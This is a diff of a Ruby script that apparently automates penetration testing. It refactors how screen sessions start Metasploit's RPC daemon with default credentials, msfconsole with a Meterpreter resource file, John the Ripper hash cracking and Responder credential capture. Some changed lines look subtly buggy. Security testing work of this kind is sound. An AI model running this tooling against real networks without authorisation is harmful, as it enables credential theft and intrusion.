@@ -1180,31 +1180,52 @@ def createDatabase()
 	end
 end
 
+def runScreen(screenName,runCmd,watchExe,sleepTime)
+	cmd = "screen -list | grep "+screenName
+	results = run_cmd(cmd)
+	if results.length<1
+		cmd = "screen -dmS "+screenName
+		if $verbose==true
+			puts run_cmd(cmd)
+		else
+			run_cmd(cmd)
+		end
+		cmd = "screen -S "+screenName+" -X stuff '"+runCmd+"'"
+		if $verbose==true
+			puts run_cmd(cmd)
+		else
+			run_cmd(cmd)
+		end
+	else
+		cmd = "killall "+watchExe
+		results = run_cmd(cmd)
+		puts results
+		
+		cmd = "ps aux | grep "+watchExe+" | grep -v grep | awk '{print $2}'"
+		puts cmd
+		results = run_cmd(cmd)		
+		if results.length<1
+			cmd = "screen -S "+screenName+" -X stuff '"+runCmd+"'"
+			puts cmd
+			results = run_cmd(cmd)
+			if $verbose==true
+				return results
+			end
+		end
+	end
+	#sleep sleepTime
+end
+
 def setup()
 	print Color.green,Color.bold,'[*] Setting up',Color.clear+"\n"
 	#initiateMetasploit()
 
 	#Check if msfrpcd is running
-	cmd = "screen -list | grep rpcdscreen"
-	results = run_cmd(cmd)
-	if results.length<1
-		cmd = "screen -dmS rpcdscreen"
-		run_cmd(cmd)
-		cmd = "screen -S rpcdscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfrpcd -U msf -P msf -p 55553\n'"
-		run_cmd(cmd)
-	else
-		cmd = "killall msfrpcd"
-		results = run_cmd(cmd)
-		
-		cmd = "ps aux | grep msfrpcd | grep -v grep | awk '{print $2}'"
-		results = run_cmd(cmd)
-		if results.length<1
-			cmd = "screen -S rpcdscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfrpcd -U msf -P msf -p 55553\n'"
-			results = run_cmd(cmd)
-			if $verbose==true
-				puts results
-			end
-		end
+	cmd = '/bin/bash --login\nrvm use 1.9.3-p484\nmsfrpcd -U msf -P msf -p 55553\n'
+	results =
+	runScreen("rpcdscreen",cmd,"msfrpcd",0)
+	if $verbose==true
+		puts results
 	end
 
 	#Check if psexec and wmiexec exists
@@ -1251,27 +1272,9 @@ def setup()
 	#	file.write("set LPORT 8443\n")
 	#	file.write("exploit -j -z\n")
 	#}	
-	cmd = "screen -list | grep msfscreen"
-	results = run_cmd(cmd)
-	if results.length<1
-		cmd = "screen -dmS msfscreen"
-		run_cmd(cmd)
-		cmd = "screen -S msfscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfconsole -r meterpreter.rc\n'"
-		puts cmd
-		run_cmd(cmd)
-	else
-		cmd = "ps aux | grep msfconsole | grep -v grep | awk '{print $2}'"
-		results = run_cmd(cmd)
-		msfRunning = false
-		if results.length>0
-			msfRunning = true
-		else
-			cmd = "screen -S msfscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfconsole -r meterpreter.rc\n'"
-			run_cmd(cmd)
-			puts "[*] Sleeping for 30 seconds to wait for Metasploit to start"
-			sleep(30)
-		end
-	end
+	
+	cmd = "/bin/bash --login\nrvm use 1.9.3-p484\nmsfconsole -r meterpreter.rc\n"
+	runScreen("msfscreen",cmd,"msfconsole",30)
 end
 
 def getGateway()
@@ -1858,26 +1861,12 @@ def crackHash()
 			file.close unless file == nil
 		end
 		print Color.green,Color.bold,'[*] Cracking hashes in background...',Color.clear+"\n"
-		cmd = "screen -list | grep jtrscreen"
-		results = run_cmd(cmd)
-		if results.length<1
-			cmd = "screen -dmS jtrscreen"
-			run_cmd(cmd)
-			cmd = "screen -S jtrscreen -X stuff '/bin/bash --login\n/usr/sbin/john  --rules:KoreLogic --wordlist=/mnt/hgfs/passwords/500-worst-passwords.txt /tmp/hash\n'"
-			run_cmd(cmd)
-		else
-			cmd = "killall john"
-			results = run_cmd(cmd)
-			
-			cmd = "ps aux | grep john | grep -v grep | awk '{print $2}'"
-			results = run_cmd(cmd)
-			if results.length<1
-				cmd = "screen -S jtrscreen -X stuff '/bin/bash --login\n/usr/sbin/john --rules:KoreLogic  --wordlist=/mnt/hgfs/passwords/500-worst-passwords.txt /tmp/hash\n'"
-				results = run_cmd(cmd)
-				if $verbose==true
-					puts results
-				end
-			end
+		
+		runCmd = '/bin/bash --login\n/usr/sbin/john  --rules:KoreLogic --wordlist=/mnt/hgfs/passwords/500-worst-passwords.txt /tmp/hash\n'
+		puts runCmd
+		results = runScreen("jtrscreen",runCmd,"john",0)
+		if $verbose==true
+			puts results
 		end
 		sleep 180
 	}
@@ -1919,6 +1908,10 @@ def watchResponderDir()
 end
 
 def startApps()
+ #start responder
+ puts "[*] Starting Responder."
+ cmd = "python /pentest/Responder/Responder.py -wrfdfwFb --lm -i "+local_ip
+ runScreen("respondrScreen",cmd,"responder",0)
 end
 
 def sampleData()
